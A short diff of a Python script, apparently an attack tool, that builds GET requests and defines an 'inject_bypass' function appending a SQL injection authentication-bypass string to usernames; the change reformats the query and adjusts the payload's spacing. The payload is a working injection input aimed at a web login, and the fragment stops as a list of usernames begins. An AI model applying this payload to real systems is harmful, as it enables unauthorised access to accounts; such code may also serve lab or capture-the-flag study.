@@ -5,17 +5,16 @@ import urllib.request as urlr
 
 def send_request(params, url):
     query = urlp.urlencode(params)
+    url = url + "?" + query
 
-    url = url + "?u=" + params["u"]
-
-    print(url)
+    # print(url)
     with urlr.urlopen(url) as response:
         return (response.read(400), url)
 
 
 def inject_bypass(user):
     # return user + "\"--"
-    return user + "\" or 1 == 1-- "
+    return user + "\" or 1 == 1 -- "
 
 
 usernames = {
